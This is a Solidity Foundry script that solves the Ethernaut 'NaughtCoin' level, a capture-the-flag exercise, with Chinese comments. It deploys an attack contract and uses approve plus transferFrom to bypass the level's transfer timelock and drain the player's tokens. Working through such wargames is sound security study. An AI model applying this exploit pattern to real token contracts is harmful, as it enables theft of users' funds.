// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/NaughtCoin.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";

// target 讓 player(你) 的餘額歸零
// ERC-20 有兩種轉帳方式, transfer()、transferFrom()
// 1.Player 授權代幣總供給數量給攻擊合約
// 2.攻擊合約對關卡呼叫 transferFrom(), 把 Player 身上的代幣全部轉進攻擊合約, 就可以讓 Player 持有代幣歸零

contract attackCon {
    NaughtCoin attackInstance;
    constructor(address _attackInstance) {
        attackInstance = NaughtCoin(_attackInstance);
    }

    function attack() external {
        (bool result, ) = address(attackInstance).call(
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                msg.sender,
                address(this),
                1000000 * (10 ** 18)
            )
        );
        if (result) {}
    }
}
contract Lev15Sol is Script {
    NaughtCoin public Lev15Instance =
        NaughtCoin(0x68D6F76F3A83Cae5e6731302B824312519a345F5);
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        attackCon myattack = new attackCon(address(Lev15Instance));
        IERC20(address(Lev15Instance)).approve(
            address(myattack),
            1000000 * (10 ** 18)
        );
        myattack.attack();

        vm.stopBroadcast();
    }
}
